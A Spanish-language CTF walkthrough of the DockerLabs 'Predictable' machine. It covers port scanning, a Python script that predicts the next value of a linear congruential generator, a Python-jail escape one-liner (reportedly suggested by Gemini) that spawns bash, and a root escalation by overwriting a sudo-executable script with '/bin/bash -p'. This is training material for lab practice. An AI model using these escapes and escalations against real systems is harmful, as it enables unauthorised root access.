---
title: "Write-up Predictable DockerLabs"
description: "Guia completa paso a paso de como resolver la maquina Predictable de la plataforma DockerLabs."
date: 2026-03-06
creator: "C4rta"
rating: 5 
dificultad: "Medio"
author: "Ghxstsec"
draft: false
type: "post"
---

Write-Up Máquina Predictable DockerLabs — Hard [ES]
=====================================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nTqmN7qvllcraJVtA3pyCg.png)


En este artículo estaremos viendo la forma de rootear la máquina predictable de la plataforma DockerLabs creada por Mario Álvarez Fernández (El Pingüino de Mario en YT), y un método de escalada de privilegios más común.

Hey! Por aquí os dejo mi write-up a mi manera de la máquina Predictable de la plataforma DockerLabs

Bueno, como siempre empezamos con el escaneo de nmap:

```
sudo nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 172.17.0.2
```

que nos reporta esto:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cPsLQQtBSL1IQKzoPr48SA.png)

Podemos ver un puerto 22 y un puerto 1111 abiertos:

> 22/tcp open ssh OpenSSH 9.7p1 Debian 5 (protocol 2.0)
> 
> 1111/tcp open http Werkzeug httpd 3.0.3 (Python 3.11.9)

Vamos a ver qué hay en el puerto 1111, tiene pinta de una web.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uAeaiHaEjbhMg3xLmW1aJA.png)

Nos encontramos con esto, pruebo con unos cuantos comandos SSTI, pero nada, vamos a ver el código fuente:

![captionless image](https://miro.medium.com/v2/resize:fit:990/format:webp/1*wQtIt4xu2AWhFdDzm9lv5g.png)

Podemos ver que el creador de la página nos ha dejado el código fuente del tema de las semillas apuntado en el source-code, si buscamos información sobre que es esto podemos ver lo siguiente:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HMKr4IHW9Rn6VEirYwyVqg.png)

Podemos ver en un repositorio de GitHub sobre este generador, pero en Python, y podemos ver la matemática que usa y el fondo teórico.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*su_GoP6DCnbL5ZlFCWeuJw.png)

Podemos ver que podemos generar la siguiente semilla según el código fuente, usando un código Python para reversear el programa, usando las semillas en la tabla y las que están citadas en el código fuente:

```
# Este script es el resultado de la explotacion inicial de un CTF de DockerLabs (Predictable)
# Esta hecho para sacar el siguiente numero de un Generador Lineal Congruencial (LCG) a partir de una tabla
# Se necesitan minimo 4 datos para ver el siguiente numero
# Made by Ghxstsec
import sys
def solve_lcg_universal():
    print("="*50)
    print("   LCG PREDICTOR (MODO TRES PUNTOS)")
    print("="*50)
    try:
        n = 9223372036854775783 
        print("[*] Introduce 3 números CONSECUTIVOS de la tabla:")
        x1 = int(input("    [1/4] Primer valor (X1): "))
        x2 = int(input("    [2/4] Segundo valor (X2): "))
        x3 = int(input("    [3/4] Tercer valor (X3): "))
        
        print("\n[*] Punto de predicción:")
        x_last = int(input("    [4/4] Último valor conocido (X99): "))
        # --- LÓGICA MATEMÁTICA ---
        # m = (X3 - X2) * inv(X2 - X1) mod n
        num = (x3 - x2) % n
        den = (x2 - x1) % n
        
        # Inverso modular
        m = (num * pow(den, -1, n)) % n
        # c = X2 - (X1 * m) mod n
        c = (x2 - (x1 * m)) % n
        print("\n" + "-"*50)
        print(f"[+] Multiplicador (m) hallado: {m}")
        print(f"[+] Incremento (c) hallado:    {c}")
        print("-"*50)
        # Verificación: ¿El cálculo genera X3 a partir de X2?
        if (x2 * m + c) % n == x3:
            print("[✔] ¡Constantes Verificadas!")
            x_next = (x_last * m + c) % n
            print(f"\n[!!!] Siguiente numero del GLC: {x_next}\n")
        else:
            print("[X] ERROR: Los números no siguen una secuencia LCG.")
    except ValueError:
        print("\n[-] ERROR: No existe inverso modular. Esto ocurre si los números no son consecutivos.")
if __name__ == "__main__":
    solve_lcg_universal()
```

![captionless image](https://miro.medium.com/v2/resize:fit:1182/format:webp/1*eCV7WNSKvyM8bqcoape2uQ.png)

Si usamos el código obtenido en la web podemos ver que nos dará la siguiente string (Redactada por no dar la solución)

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fQGmvcYdinuvMQ-fMwcn2w.png)

La verdad que me partí la cabeza intentando saber qué hacer con esta cadena, pero recordé que había el puerto SSH abierto en la máquina, así que así procedí:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SvxIdhN1dB_Y8ShP8Fq4Yg.png)

PyJail? Hmm, busco información sobre que es esto y encuentro lo siguiente:

[https://medium.com/@RosanaFS/escaping-a-python-jail-pyjail-tokyo-ghoul-tryhackme-walkthrough-270-points-a1a08bc0d7cd](https://medium.com/@RosanaFS/escaping-a-python-jail-pyjail-tokyo-ghoul-tryhackme-walkthrough-270-points-a1a08bc0d7cd)

Probando algún que otro import y tal, veo que la mayoría para generar un TTY están bloqueados:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ByqJJvq_dbovfqk74cwQFg.png)

Así que le pregunto a Gemini por comando para salir de este pyjail, me sale con este comando:

```
getattr(globals()['__builtins__'], '__imp'+'ort__')('subprocess').run(['bash'])
```

Asi que lo probamos:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EnN1okGh4dDZ4el2dMdQGQ.png)

Vale, pues ya tenemos el usuario, vamos a ver como se plante la escalada de privilegios:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jti3PUOUkns7hvKbaAReAQ.png)

Vemos que tenemos sudo sobre el script /opt/shell: Vamos a analizarlo:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*75QZmkJ2rAhC48cZ2eFHHQ.png)

Tenemos radare2, pero lo veo demasiado complejo jajaja, vamos a ver los permisos de escritura, ya que como en él sudo -l tenemos la ruta definitiva al archivo /opt/shell, se podría modificar el archivo y ejecutarlo como root con sudo, como hicimos en la máquina library, tengo un video en mi canal de YouTube sobre esa máquina:

Así que procedemos:

![captionless image](https://miro.medium.com/v2/resize:fit:964/format:webp/1*EVmXCQAWHkJMjuwxTDE7YQ.png)

Podemos ver que tenemos permisos SUID sobre el archivo, vamos a probar de editarlo:

![captionless image](https://miro.medium.com/v2/resize:fit:690/format:webp/1*llEchCDBWYDOrtgvTPwJig.png)

Podemos ver que no lo podemos editar gráficamente, pero tenemos el comando echo instalado en la máquina así que cambiamos el script para iniciar una Shell en bash:

```
cat << EOF > /opt/shell
#!/bin/bash
/bin/bash -p
EOF
```

ejecutamos el script como sudo:

![captionless image](https://miro.medium.com/v2/resize:fit:980/format:webp/1*3EFpJNvIgcu8eopCPEQ2Qw.png)

Así que hasta ahí llegaría la máquina, estuve leyendo write-ups un rato después de resolverla y vi que había otra forma de hacer la escalada de privilegios más creativa, la verdad, inyectando bytes en el script y tal.

¡Pero bueno ese método se podría ver otro día en otro writeup! :)

! Hasta Pronto!


```
👋 Sobre el autor

¡Hola! Soy Ghxstsec (Joel Morillas), un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.

Actualmente, poseo las certificaciones eJPTv2 y eCPPTv3. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.

✉️ Conéctate conmigo:

LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
GitHub: [GitHub](https://github.com/Ghxstsec)
Twitter/X: [Twitter](https://x.com/Louikizz)
Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)

¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊
```
